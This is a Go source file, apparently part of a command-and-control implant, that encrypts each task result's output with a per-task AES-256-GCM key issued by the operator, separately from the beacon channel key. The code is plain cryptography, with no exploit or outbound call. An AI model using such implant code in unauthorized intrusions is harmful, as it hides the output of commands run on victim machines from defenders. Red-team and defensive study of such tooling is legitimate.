//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
)

// applyTaskKeyEncryption seals a task result's Output with the per-task
// AES-256-GCM key issued by the operator (task.Key). This gives per-result
// confidentiality independent of the session/beacon channel key (P2: per-task
// encryption). The server decrypts using the key it generated for the task.
// On any key/format error the result is left untouched so it still reaches the
// server (just unencrypted) rather than being dropped.
func applyTaskKeyEncryption(keyB64 string, res *TaskResult) {
	if keyB64 == "" {
		return
	}
	raw, err := base64.StdEncoding.DecodeString(keyB64)
	if err != nil || len(raw) != 32 {
		if Debug {
			fmt.Printf("[!] per-task key invalid (need 32 raw bytes): %v\n", err)
		}
		return
	}
	block, err := aes.NewCipher(raw)
	if err != nil {
		return
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return
	}
	ct := gcm.Seal(nonce, nonce, []byte(res.Output), nil)
	res.Output = base64.StdEncoding.EncodeToString(ct)
	res.EncryptedWithTaskKey = true
	res.Encoding = ""
}
